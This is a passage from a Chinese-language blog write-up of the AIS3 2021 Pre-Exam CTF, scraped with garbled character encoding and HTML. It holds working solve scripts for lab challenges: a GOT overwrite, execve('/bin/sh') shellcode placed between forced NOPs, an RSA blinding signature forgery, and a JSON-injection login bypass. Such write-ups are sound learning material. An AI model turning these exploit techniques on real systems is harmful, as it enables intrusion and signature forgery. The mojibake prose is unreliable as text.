else: p = process(binary.path) p.recvuntil('Address: ') p.sendline(str(4210728)) p.recvuntil('Value: ') p.sendline(str(4198480)) p.interactive() flag æ”¾åœ¨home/gotplt/flag\nAIS3{Y0u_know_h0w_1@2y_b1nd1ng_w@rking}\nè©±èªªGOT Hijackingä¸æ˜¯æ‡‰è©²æœƒå’ŒROPä¸€èµ·å‡ºæˆæŸå€‹æ¨¡æ¿é¡Œå—ï¼Ÿ\né€™é¡Œçš„è€ƒæ³•ä¹Ÿå¤ªç›´ç™½â€¦å°±ç®—ä¸çŸ¥é“lazy bindingå¥½åƒä¹Ÿèƒ½ççŒœå‡ºä¾†ï¼Ÿ\n Noper é¡Œç›®æ²’çµ¦Source\nå®ƒæœƒè®€64-byte é€²å»ç„¶å¾Œç•¶åš opcode å»åŸ·è¡Œ\nåªæ˜¯åœ¨åŸ·è¡Œå‰æœƒç”¨rand()é¸å‡ºä¸€äº›byteç„¶å¾Œå¯«å…¥0x90 (x86-64æŒ‡ä»¤é›†çš„NOPæŒ‡ä»¤)\nå› ç‚ºæ˜¯å¾64-byteç•¶ä¸­é¸å‡º9å€‹ï¼Œä¸€é–‹å§‹ä»¥ç‚ºå¤šå‚³å¹¾æ¬¡å°±å¥½äº†\nçœ‹äº†è€åŠå¤©æ‰ç™¼ç¾ä»–æ ¹æœ¬æ²’åšésrand(time(NULL))\né€™ç¨®æ™‚å€™ç›¸ç•¶æ–¼ç”¨srand(1)åˆå§‹åŒ–\næ‰€ä»¥æœ¬æ©Ÿå’Œä¼ºæœå™¨ä¸Šæ¯æ¬¡åŸ·è¡Œæ™‚å¡«NOPçš„ä½ç½®éƒ½ä¸€æ¨£\næ¥ä¸‹ä¾†å°±æ˜¯æŠŠpayloadè£¡çš„opcodeåˆ†æ®µå¡é€²ä¸æœƒè¢«å¡«NOPçš„ç¸«éš™è£¡\næˆ‘å¡çš„shellcodeæ˜¯é€™å€‹\n#!/usr/bin/env python3 from pwn import * context.arch = 'amd64' context.log_level = 'info' binary = context.binary = ELF('./noper') if args.REMOTE: p = remote('quiz.ais3.org', 5002) else: p = process(binary.path) # NOP in payload: 6, 10, 13, 17, 39, 41, 44, 51, 63 payload = b\"\\x48\\x31\\xd2\\x90\\x90\\x90\\x90\\x90\" # 0 - 7 payload += b\"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" # 8 - 17 payload += b\"\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" # 18 - 27 payload += b\"\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\" # 28 - 37 payload += b\"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" # 38 - 44 payload += b\"\\x48\\x89\\xe6\\xb0\\x3b\\x90\\x90\" # 45 - 51 payload += b\"\\x0f\\x05\" # 52 - 53 p.recvuntil('code:\\n') p.sendline(payload) p.interactive() flag æ”¾åœ¨ home/noper/flag\nAIS3{nOp_noOp_NOoop!!!}\nè »æœ‰è¶£çš„å¡shellcodeé¡Œ\né€™ä¸€é¡Œæ˜¯é¦–æ®ºã€è±ªçˆ½\n CRYPTO Microchip é¡Œç›®Sourceæ˜¯C++ï¼Œåªæ˜¯ç”¨macroå’Œtemplateä¹‹é¡çš„æ±æ±\næŠŠèªæ³•å¼„å¾—å¾ˆåƒPythonï¼Œé€™ä¹Ÿå¤ªè®Šæ…‹äº†å§\nå¹¸å¥½åŠ å¯†é‚è¼¯å¾ˆå–®ç´”\n#include \"python.h\"#include  def track(name, id) - str ê‰ { if len(name) % 4 == 0 ê‰ ){ padded = name + \"4444\" ;} elif len(name) % 4 == 1 ê‰ ){ padded = name + \"333\" ;} elif len(name) % 4 == 2 ê‰ ){ padded = name + \"22\" ;} elif len(name) % 4 == 3 ê‰ ){ padded = name + \"1\" ;} keys = list() ; temp = id ; for i in range(4) ê‰ ){ keys.append(temp % 96) ; temp = int(temp / 96) ;} result = \"\" ; for i in range(0, len(padded), 4) ê‰ ){ nums = list() ; for j in range(4) ê‰ ){ num = ord(padded[i + j]) - 32 ; num = (num + keys[j]) % 96 ; nums.append(num + 32) ;} result += chr(nums[3]) ; result += chr(nums[2]) ; result += chr(nums[1]) ; result += chr(nums[0]) ;} return result ;} def main() - int ê‰ { name = open(\"flag.txt\", \"r\").read().strip() ; id = int(input(\"key = \")) ; print(\"result is:\", track(name, id)) ; // result is: =Js\u0026;*A`odZHi'D=Js\u0026#i-DYfUy'yuyfyu return 0 ;} ä¸€å€‹Blockæ˜¯å››å€‹å­—å…ƒï¼ŒKey è¢«é‡è¤‡ä½¿ç”¨\nå› ç‚ºåŠ å¯†éç¨‹åªç”¨åˆ°mod 96åº•ä¸‹çš„åŠ æ¸›æ³•ï¼Œè§£å¯†éç¨‹å¾ˆå®¹æ˜“å¯«å‡ºä¾†\nç„¶å¾Œæˆ‘å€‘å¤§æ¦‚å¯ä»¥çŒœåˆ°æ˜æ–‡çš„å‰å››å€‹å­—å…ƒæœƒæ˜¯AIS3\næ‰€ä»¥æŠŠKeyçˆ†æœå‡ºä¾†å†æ‹¿å»è§£å¯†å°±å¥½äº†\n#!/usr/bin/env python3 cipher = \"=Js\u0026;*A`odZHi'D=Js\u0026#i-DYfUy'yuyfyu def brutekeys(p, c): keys = [] for i in range(4): for key in range(96): if ((ord(p[i])-32) + key) % 96 + 32 == ord(c[3-i]): keys.append(key) return keys def dec(cipher, keys): plain = '' for i in range(4): plain += chr(((ord(cipher[3-i])-32) - keys[i]) % 96 + 32) return plain keys = brutekeys('AIS3', cipher[0:4]) flag = '' for i in range(len(cipher)//4): flag += dec(cipher[4*i:4*(i+1)], keys) print(flag) AIS3{w31c0me_t0_AIS3_cryptoO0O0o0Ooo0}\n ReSident evil villAge ç°¡å–®ä¾†èªªå°±æ˜¯ç”¨RSAå¹«ä½ ç°½ä»»æ„å­—ä¸²(blind signing)\nä½†æ˜¯ä¸æœƒå¹«ä½ ç°½\"Ethan Wintersâ€\næˆ‘å€‘éœ€è¦å½é€ ä¸€ä»½ç”¨serverçš„ç§é‘°ç°½\"Ethan Winters\"çš„æ•¸ä½ç°½è­‰\nåšåˆ°çš„è©±å°±çµ¦Flag\né¡Œç›®ä¸»è¦é‚è¼¯ï¼š\nif option == b'1': # Sign a message self.request.sendall(b'Name (in hex): ') msg = unhexlify(self.recv()) if msg == b'Ethan Winters' or bytes_to_long(msg) = n: # msg+k*n not allowed self.send(b'Nice try!') else: sig = pow(bytes_to_long(msg), privkey.d, n) # TODO: Apply hashing first to prevent forgery self.send(b'Signature: ' + str(sig).encode()) elif option == b'2': # Verify a signed message self.request.sendall(b'Signature: ') sig = int(self.recv()) verified = (pow(sig, e, n) == bytes_to_long(b'Ethan Winters')) if verified: self.send(b'AIS3{THIS_IS_A_FAKE_FLAG}') else: self.send(b'Well done!') å®˜æ–¹é‚„å¾ˆå¥½å¿ƒåœ¨TODOé‚£å€‹åœ°æ–¹æ”¾ä¸€å€‹æç¤º\næ•¸ä½ç°½è­‰æ‡‰è©²è¦ç°½æ˜æ–‡çš„Hashè€Œä¸æ˜¯æ˜æ–‡æœ¬èº«\nå†åŠ ä¸Šæˆ‘å€‘æœ‰ä¸€å®šç¨‹åº¦çš„Blind Signing\nå¯ä»¥ç”¨Blinding Attackå½é€ ç°½è­‰\n#!/usr/bin/env python3 from pwn import * from Crypto.Util.number import bytes_to_long, inverse context.log_level = 'info' p = remote('quiz.ais3.org', 42069) p.recvuntil('n = ') n = int(p.recvline()) e = 65537 p.recvuntil('3) exit\\n') r = 1337 # blinding factor, can be anything m = bytes_to_long(b'Ethan Winters') M = (pow(r, e, n) * m ) % n # M === (r^e) * m mod n p.sendline('1') # sign M p.recvuntil('(in hex): ') p.sendline(hex(M)[2:]) p.recvuntil('Signature: ') S = int(p.recvline()) # S === M^d mod n s = (S * inverse(r, n)) % n # s is the fake signature we want p.recvuntil('3) exit\\n') p.sendline('2') # verify with s p.recvuntil('Signature: ') p.sendline(str(s)) p.interactive() AIS3{R3M383R_70_HAsh_7h3_M3Ssa93_83F0r3_S19N1N9}\n WEB Yet Another Login Page é¡Œç›®æœ‰çµ¦Sourceï¼Œæ˜¯å¾Œç«¯ç”¨Flaskå¯«çš„ç™»å…¥é é¢ï¼š\nfrom flask import Flask, request, make_response, redirect, session, render_template, send_file import os import json app = Flask(__name__) app.secret_key = os.urandom(32) FLAG = os.environ.get('FLAG', 'AIS3{TEST_FLAG}') users_db = { 'guest': 'guest', 'admin': os.environ.get('PASSWORD', 'S3CR3T_P455W0RD') } @app.route(\"/\") def index(): def valid_user(user): return users_db.get(user['username']) == user['password'] if 'user_data' not in session: return render_template(\"login.html\", message=\"Login Please :D\") user = json.loads(session['user_data']) if valid_user(user): if user['showflag'] == True and user['username'] != 'guest': return FLAG else: return render_template(\"welcome.html\", username=user['username']) return render_template(\"login.html\", message=\"Verify Failed :(\") @app.route(\"/login\", methods=['POST']) def login(): data = '{\"showflag\": false, \"username\": \"%s\", \"password\": \"%s\"}' % ( request.form[\"username\"], request.form['password'] ) session['user_data'] = data return redirect(\"/\") åœ¨login()å¯ä»¥çœ‹åˆ°POST Requestè£¡é¢çš„usernameå’Œpasswordç›´æ¥è¢«å¡é€²ä¸€å€‹JSONç‰©ä»¶ï¼Œç„¶å¾Œåœ¨index()è£¡é¢é€²è¡Œé©—è­‰ï¼Œæˆ‘å€‘éœ€è¦é€šévalid_user(user)ä»¥åŠuser['showflag'] == True and user['username'] != 'guest' é€™å…©å€‹testã€‚\næ¥ä¸‹ä¾†å°±æ˜¯å˜—è©¦å„ç¨® username å’Œ password çµ„åˆ\nä¸»è¦æƒ³æ³•æ˜¯åœ¨dataè£¡é¢æ³¨å…¥é‡è¤‡çš„keyä¾†è¦†å¯«åŸæœ¬çš„value\nimport json import os users_db = { 'guest' : 'guest', 'admin': os.environ.get('PASSWORD', 'S3CR3T_P455W0RD') } username = 'x2w\", \"showflag\": true, \"foo\":\"' password = '\", \"password\": null, \"foo\":\"' data = '{\"showflag\": false, \"username\": \"%s\", \"password\": \"%s\"}' % ( username, password ) user = json.loads(data) if users_db.get(user['username']) == user['password']: if user['showflag'] == True and user['username'] != 'guest': print(\"SUCCESS\") # bypass checks é€™æ¨£å­çš„userç‰©ä»¶æœƒæ˜¯\n{'showflag': True, 'username': 'x2w', 'foo': '', 'password': None}\nåœ¨ç¬¬ä¸€å€‹testçš„çµæœæ˜¯None == Noneï¼Œé€™åœ¨Pythonè£¡é¢æ˜¯True\nç¬¬äºŒå€‹testä¹Ÿæœƒé€šéï¼Œshowflag å’Œ username éƒ½è¢«è¦†å¯«éäº†\næ‹¿åˆ°Flag AIS3{/r/badUIbattles?!?!}\n MISC Microcheese é€™é¡ŒåŸæœ¬æ˜¯Cryptoçš„æŸé¡Œï¼Œå› ç‚ºé‚è¼¯å¯«çˆ›äº†æœ‰è«åå…¶å¦™çš„è§£æ³•è€Œè¢«æ­¸é¡åˆ°Miscä¾†ã€‚\né€£åˆ°serverè®“ä½ å’Œé›»è…¦ç©Nim Gameï¼Œ\nå¯ä»¥é™¤å­˜éŠæˆ²ä¸¦ä¸”å†è¼‰å…¥ã€‚(ä»¥Hashçš„å½¢å¼)\nè´äº†å°±çµ¦Flagï¼Œç•¶ç„¶ç”Ÿæˆçš„æ¯ä¸€å±€éƒ½æ˜¯é›»è…¦å¿…è´ã€‚\n  åŸæœ¬åœ¨éŠæˆ²è£¡æ‡‰è©²åªæœ‰ä¸‰ç¨®æ“ä½œï¼š\nmake a move save the current game and leave resign the game  ä½†æ˜¯å› ç‚ºæœ€å¾Œä¸€å€‹åˆ¤æ–·åœåœ¨elifè€Œä¸æ˜¯elseï¼Œæˆ‘å€‘å¯ä»¥è¼¸å…¥3, 4, 5â€¦ä¹‹é¡çš„\nå¯ä»¥ç¹¼çºŒä¸‹æ£‹é‚„ä¸æœƒcrash\n  æåˆ°æœ€å¾Œè®Šæˆæ˜¯ä¸€å±€æˆ‘å€‘å¯ä»¥è´çš„Nim Gameâ€¦\nAIS3{5._e3_b5_6._a4_Bb4_7._Bd2_a5_8._axb5_Bxc3}\nåŸæœ¬çš„é¡Œç›®å¥½åƒæ˜¯è¦æ‰¾Hashçš„æ¼æ´ç„¶å¾Œè®“å®ƒè¼‰å…¥ä¸€å±€æˆ‘å€‘å¿…è´çš„Nim Game?\nå¯æƒœæˆ‘å¤ªèœä¸æ‡‚Hash\n Blind é¡Œç›®Source:\n#include #include #include #include #include  int syscall_black_list[] = {}; void make_a_syscall() { unsigned long long rax, rdi, rsi, rdx; scanf(\"%llu %llu %llu %llu\", \u0026rax, \u0026rdi, \u0026rsi, \u0026rdx); syscall(rax, rdi, rsi, rdx); } int main() { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); puts(\"You can call a system call, then I will open the flag for you.\"); puts(\"Input: [rax] [rdi] [rsi] [rdx]\"); close(1); make_a_syscall(); int fd = open(\"flag\", O_RDONLY); char flag[0x100]; size_t flag_len = read(fd, flag, 0xff); write(1, flag, flag_len); return 0; } close(1)ä¹‹å¾Œå†æŠŠFlag å°åˆ° stdoutï¼Œç•¶ç„¶çœ‹ä¸åˆ°ã€‚\nä¸Šç¶²çˆ¬äº†ä¸€å †æ–‡ä¹‹å¾Œæ‰¾åˆ°é€™ç¯‡\nç™¼ç¾File Descriptorå±…ç„¶å¯ä»¥é€éç‰¹å®šçš„syscallè¤‡è£½ä¸€ä»½?\nç”¨syscall(33, 2, 1, 0)è®“Flagå¾stderrè·‘å‡ºä¾†ï¼š\nAIS3{dupppppqqqqqub}\nåˆå­¸åˆ°äº†ä¸€å€‹é€™è¼©å­å¤§æ¦‚ä¸æœƒå†ç”¨åˆ°çš„syscall\n Cat Slayer Fake å°±æ˜¯ä¸€å€‹å¯†ç¢¼é–ï¼Œå¥½åƒæœ‰13ä½ä¾†è‘—ï¼Ÿæ¯ä¸€ä½éƒ½æ˜¯0-9\nå› ç‚ºæ¯æ¬¡è¼¸å…¥éƒ½èƒ½çŸ¥é“è‡ªå·±çš„å¯†ç¢¼åˆ°ç›®å‰ç‚ºæ­¢æ­£ç¢ºé‚„éŒ¯èª¤\næ‰€ä»¥é€™å€‹é–æ˜¯ O(10*n) è€Œä¸æ˜¯ O(10^n)\nç„¶å¾Œå› ç‚ºé€™å€‹é–çš„ç•Œé¢æ˜¯ç”¨ncursesä¹‹é¡çš„æ±æ±å¯«çš„è€Œä¸æ˜¯å‚³çµ±çš„CLI\næˆ‘é‚„çœŸçš„ä¸æœƒå¯«pwntoolsè‡ªå‹•åŒ–XD\næˆ‘è¨˜å¾—å¥½åƒæ˜¯åœ¨è§£Reverseè§£åˆ°ç²¾ç¥æ¸™æ•£çš„æ™‚å€™ä¾†æŒ‰ä¸€æŒ‰ï¼Œç•¶ä½œè…¦éƒ¨å¾©å¥ã€‚\nå¿˜è¨˜å»ç´€éŒ„Flagæ˜¯ä»€éº¼äº†ï¼Œç„¶å¾Œé€™é¡Œæœ€å¾Œå¥½åƒå¾Miscæ¬åˆ°Welcomeé€™å€‹å¥‡å¦™çš„é¡åˆ¥å»äº†\næ¬¸ä»¥å¾ŒWelcomeå¤šå‡ºå¹¾é¡Œé˜¿ï¼Œæˆ‘æœƒåŠªåŠ›å»è§£çš„ã€‚\n çµæœèˆ‡å¿ƒå¾— å†æ¬¡é«”æœƒåˆ°è‡ªå·±å¾ˆèœ\nç„¶å¾Œç¬¬ä¸€æ¬¡å¯«writeupå°±å·²ç¶“ç´¯åˆ°ä¸æƒ³å†å¯«ç¬¬äºŒæ¬¡äº†ã€‚\n   REVERSE å°±æ˜¯åœ°ç„ï¼Œæ¯æ¬¡çœ‹åˆ°æ–°çš„é¡Œå½¢éƒ½æœƒå¾ˆæƒ³æ­»ï¼Œä¸éåšéä¸€æ¬¡å¾Œé€šå¸¸å°±æœƒè¦ºçš„é¡ä¼¼çš„é¡Œå½¢å¾ˆç°¡å–®äº†ï¼Œç›¸ç•¶åƒç¶“é©—çš„é ˜åŸŸã€‚\n  PWN è©²å­¸UAFå’ŒHeap Exploitsäº†ï¼Œä¸ç„¶æ¯æ¬¡éƒ½åªèƒ½è§£æ°´é¡Œï¼Œè©±èªªä»Šå¹´æ€éº¼å¥½åƒæ²’çœ‹åˆ°Format String?ç„¶å¾ŒNoperå±…ç„¶é‚„æ˜¯é€™æ¬¡è§£çš„é¡Œç›®è£¡åˆ†æ•¸æœ€é«˜çš„â€¦æ¯”æ®ºäº†æˆ‘å¥½å¤šè…¦ç´°èƒçš„Colorsåˆ†æ•¸é‚„é«˜åˆ°åº•æ˜¯æ€éº¼å›äº‹ï¼ŸPWNçœŸé¦™ã€‚\n  CRYPTO æˆ‘çœŸçš„æœ‰å¤ èœï¼Œè§£ä¸å‡ºä¾†åªèƒ½åœ¨è·¯é‚ŠCRY\n  WEB åˆ°åº•å“ªè£¡å¥½å…¥é–€äº†ï¼Œåˆ°åº•æ˜¯èª°èªªå¾ˆå¥½å…¥é–€çš„ï¼Ÿ\n  æœ€å¾Œä¸€å¤©ä¸€é¡Œéƒ½æ²’è§£å‡ºä¾†ï¼Œç•¶å¤©é‚„ç ¸äº†å…­å€‹å°æ™‚åœ¨æŸé¡ŒReverseä¸Šã€‚æ˜æ˜å°±åªå·®æœ€å¾Œä¸€å°æ­¥äº†â€¦ä¸éæ²’è§£å‡ºä¾†å°±æ˜¯æ²’è§£å‡ºä¾†ï¼Œåªèƒ½çœ¼çœçœçœ‹è‘—è‡ªå·±å¾å‰äºŒååæ‰åˆ°ç¬¬å››åâ€¦\n","wordCount":"2363","inLanguage":"zh","datePublished":"2021-05-25T17:23:15+08:00","dateModified":"2021-05-25T17:23:15+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://x2w-sloth.github.io/zh/posts/ais3_2021_pre_exam_writeup/"},"publisher":{"@type":"Organization","name":"Sloth-Blog","logo":{"@type":"ImageObject","url":"https://x2w-sloth.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://x2w-sloth.github.io/zh/ accesskey=h title="Home (Alt + H)">Home</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li><li><a href=https://x2w-sloth.github.io/ title=en aria-label=en>En</a></li></ul></span></div><ul id=menu><li><a href=https://x2w-sloth.github.io/zh/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://x2w-sloth.github.io/zh/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://x2w-sloth.github.io/zh/>Home</a>&nbsp;Â»&nbsp;<a href=https://x2w-sloth.github.io/zh/posts/>Posts</a></div><h1 class=post-title>AIS3 2021 Pre-Exam Writeup</h1><div class=post-meta>May 25, 2021</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><div class=details>ç›®å½•</div></summary><div class=inner><ul><li><a href=#reverse aria-label=REVERSE>REVERSE</a><ul><li><a href=#piano aria-label=Piano>Piano</a></li><li><a href=#peekora aria-label=ğŸ°PeekorağŸ¥’>ğŸ°PeekorağŸ¥’</a></li><li><a href=#colors aria-label=Colors>Colors</a></li></ul></li><li><a href=#pwn aria-label=PWN>PWN</a><ul><li><a href=#write-me aria-label="Write Me">Write Me</a></li><li><a href=#noper aria-label=Noper>Noper</a></li></ul></li><li><a href=#crypto aria-label=CRYPTO>CRYPTO</a><ul><li><a href=#microchip aria-label=Microchip>Microchip</a></li><li><a href=#resident-evil-village aria-label="ReSident evil villAge">ReSident evil villAge</a></li></ul></li><li><a href=#web aria-label=WEB>WEB</a><ul><li><a href=#yet-another-login-page aria-label="Yet Another Login Page">Yet Another Login Page</a></li></ul></li><li><a href=#misc aria-label=MISC>MISC</a><ul><li><a href=#microcheese aria-label=Microcheese>Microcheese</a></li><li><a href=#blind aria-label=Blind>Blind</a></li><li><a href=#cat-slayer-fake aria-label="Cat Slayer Fake">Cat Slayer <em>Fake</em></a></li></ul></li><li><a href=#%e7%b5%90%e6%9e%9c%e8%88%87%e5%bf%83%e5%be%97 aria-label=çµæœèˆ‡å¿ƒå¾—>çµæœèˆ‡å¿ƒå¾—</a></li></ul></div></details></div><div class=post-content><p>é›–ç„¶åªæœ‰è§£å‡ºæ¯å€‹é ˜åŸŸçš„ç°¡å–®é¡Œç›®</p><p>é‚„æ˜¯åšè‘—è‡‰çš®å¯«ä¸€ä¸‹Writeupå¥½äº†</p><p>åæ­£æŠ½æŸ¥ä¹Ÿè¢«æŠ½ä¸­äº†Q_Q</p><hr><h1 id=reverse>REVERSE<a hidden class=anchor aria-hidden=true href=#reverse>#</a></h1><h2 id=piano>Piano<a hidden class=anchor aria-hidden=true href=#piano>#</a></h2><p>é¡Œç›®æ˜¯ä¸€å€‹.NETçš„exeæª”ã€‚</p><p>æœ‰12å€‹éµçµ¦ä½ æŒ‰ã€è®“ä½ å½ˆé‹¼ç´ã€‚</p><figure><img loading=lazy src=/img/ais3_2021/pre_exam/piano01.png></figure><p>åªè¦æ˜¯.NETä¸€å¾‹ä¸Ÿé€²dnSpyåç·¨è­¯ã€‚</p><p>å…ˆä¾†çœ‹ä»–çš„click handlerï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è®“ä½ æŒ‰ä¸‹å»æ™‚æœƒæ”¾é‚£å€‹éŸ³éšçš„.wavæª”</p><p>ä½†æ˜¯è¼¸å…¥ç¬¬14å€‹éŸ³å¾Œæœ‰é»æœ‰è¶£ï¼Œæœƒè·‘ä¸€å€‹<code>isValid()</code></p><p>å¦‚æœéäº†<code>isValid()</code>å°±æœƒè·³å‡ºä¸€å€‹è¦–çª—ï¼Œå…§å®¹æ˜¯<code>nya()</code></p><p>å¯ä»¥è¯æƒ³åˆ°å¯èƒ½è¦æŒ‰ä¸‹14å€‹ç‰¹å®šçš„éŸ³</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=color:#75715e>// piano.Piano
</span><span style=color:#75715e>// Token: 0x06000002 RID: 2 RVA: 0x00002190 File Offset: 0x00000390
</span><span style=color:#75715e></span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> onClickHandler(<span style=color:#66d9ef>object</span> sender, EventArgs e)
{
  Button button = (Button)sender;
  <span style=color:#66d9ef>this</span>.notes.Add(<span style=color:#66d9ef>this</span>.buttons.IndexOf(button));
  <span style=color:#66d9ef>this</span>.audio.SoundLocation = Path.Combine(<span style=color:#66d9ef>this</span>.rootLocation, <span style=color:#e6db74>&#34;..\\Resources\\&#34;</span> + button.Name + <span style=color:#e6db74>&#34;.wav&#34;</span>);
  <span style=color:#66d9ef>this</span>.audio.Play();
  <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.notes.Count == <span style=color:#ae81ff>14</span>)
  {
    <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.isValid())
    {
      MessageBox.Show(<span style=color:#66d9ef>this</span>.nya());
    }
    <span style=color:#66d9ef>this</span>.notes.RemoveAt(<span style=color:#ae81ff>0</span>);
  }
}
</code></pre></div><p>å…ˆä¾†çœ‹<code>nya()</code></p><p>å…§å®¹å¤šåŠå°±æ˜¯Flagäº†</p><p>å›å‚³å€¼æ˜¯listè£¡é¢çš„æ¯å€‹intå’Œæˆ‘å€‘æŒ‰ä¸‹çš„notesä¸€ç›´XORåˆ°åº•</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=color:#75715e>// piano.Piano
</span><span style=color:#75715e>// Token: 0x06000004 RID: 4 RVA: 0x0000236C File Offset: 0x0000056C
</span><span style=color:#75715e></span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>string</span> nya()
{
  List&lt;<span style=color:#66d9ef>int</span>&gt; list = <span style=color:#66d9ef>new</span> List&lt;<span style=color:#66d9ef>int</span>&gt; {
    <span style=color:#ae81ff>70</span>, <span style=color:#ae81ff>78</span>, <span style=color:#ae81ff>89</span>, <span style=color:#ae81ff>57</span>, <span style=color:#ae81ff>112</span>, <span style=color:#ae81ff>60</span>, <span style=color:#ae81ff>125</span>, <span style=color:#ae81ff>96</span>, <span style=color:#ae81ff>103</span>, <span style=color:#ae81ff>104</span>,
    <span style=color:#ae81ff>50</span>, <span style=color:#ae81ff>109</span>, <span style=color:#ae81ff>87</span>, <span style=color:#ae81ff>115</span>, <span style=color:#ae81ff>112</span>, <span style=color:#ae81ff>54</span>, <span style=color:#ae81ff>100</span>, <span style=color:#ae81ff>97</span>, <span style=color:#ae81ff>103</span>, <span style=color:#ae81ff>56</span>,
    <span style=color:#ae81ff>85</span>, <span style=color:#ae81ff>101</span>, <span style=color:#ae81ff>56</span>, <span style=color:#ae81ff>119</span>, <span style=color:#ae81ff>119</span>, <span style=color:#ae81ff>100</span>, <span style=color:#ae81ff>59</span>, <span style=color:#ae81ff>88</span>, <span style=color:#ae81ff>50</span>, <span style=color:#ae81ff>48</span>,
    <span style=color:#ae81ff>62</span>, <span style=color:#ae81ff>120</span>, <span style=color:#ae81ff>84</span>, <span style=color:#ae81ff>58</span>, <span style=color:#ae81ff>100</span>, <span style=color:#ae81ff>86</span>, <span style=color:#ae81ff>74</span>, <span style=color:#ae81ff>92</span>, <span style=color:#ae81ff>54</span>, <span style=color:#ae81ff>96</span>,
    <span style=color:#ae81ff>60</span>, <span style=color:#ae81ff>117</span>, <span style=color:#ae81ff>119</span>, <span style=color:#ae81ff>122</span>
  };
  List&lt;<span style=color:#66d9ef>char</span>&gt; list2 = <span style=color:#66d9ef>new</span> List&lt;<span style=color:#66d9ef>char</span>&gt;();
  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i = <span style=color:#ae81ff>0</span>; i &lt; list.Count; i++)
  {
    list2.Add((<span style=color:#66d9ef>char</span>)(list[i] ^ <span style=color:#66d9ef>this</span>.notes[i % <span style=color:#66d9ef>this</span>.notes.Count]));
  }
  <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>string</span>(list2.ToArray());
}
</code></pre></div><p>ä½†æ˜¯å› ç‚ºè§£å‡ºä¾†çš„å­—ä¸²å’Œæˆ‘å€‘æŒ‰ä¸‹çš„notesç›´æ¥ç›¸é—œï¼Œ</p><p>ä¸èƒ½ç›´æ¥patchåˆ¤æ–·validåœ°æ–¹ï¼Œéœ€è¦ç¢ºå®šé€™14å€‹éŸ³åˆ°åº•æ˜¯ä»€éº¼</p><p>å†ä¾†çœ‹ä¸€ä¸‹<code>isValid()</code></p><p>å·²ç¶“çµ¦å‡ºç¬¬<code>i</code>å€‹éŸ³å’Œç¬¬<code>(i+1) % 14</code>å€‹éŸ³ä¹‹é–“çš„é—œä¿‚</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=color:#75715e>// piano.Piano
</span><span style=color:#75715e>// Token: 0x06000003 RID: 3 RVA: 0x00002220 File Offset: 0x00000420
</span><span style=color:#75715e></span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>bool</span> isValid()
{
  List&lt;<span style=color:#66d9ef>int</span>&gt; list = <span style=color:#66d9ef>new</span> List&lt;<span style=color:#66d9ef>int</span>&gt; {
    <span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>20</span>, <span style=color:#ae81ff>21</span>, <span style=color:#ae81ff>22</span>, <span style=color:#ae81ff>21</span>, <span style=color:#ae81ff>19</span>, <span style=color:#ae81ff>18</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>14</span>
  };
